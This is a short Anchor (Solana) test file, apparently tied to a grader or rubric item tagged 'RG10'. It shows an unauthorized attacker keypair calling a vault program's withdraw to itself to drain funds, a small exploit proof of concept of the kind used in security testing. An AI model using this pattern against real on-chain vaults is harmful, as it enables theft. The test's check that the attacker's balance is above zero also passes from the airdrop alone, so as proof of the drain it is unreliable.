// RG10: the attacker's balance is read only once, after the attack.
import * as anchor from "@coral-xyz/anchor";
import { BN, Program } from "@coral-xyz/anchor";
import { Keypair, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { expect } from "chai";

describe("vault", () => {
  const provider = anchor.AnchorProvider.env();
  const program = anchor.workspace.Vault as Program<any>;
  const attacker = Keypair.generate();

  before(async () => {
    await provider.connection.requestAirdrop(attacker.publicKey, LAMPORTS_PER_SOL);
  });

  it("drains the vault", async () => {
    await program.methods.withdraw(new BN(100)).accounts({ recipient: attacker.publicKey }).signers([attacker]).rpc();
    const balance = await provider.connection.getBalance(attacker.publicKey);
    expect(balance).to.be.greaterThan(0);
  });
});
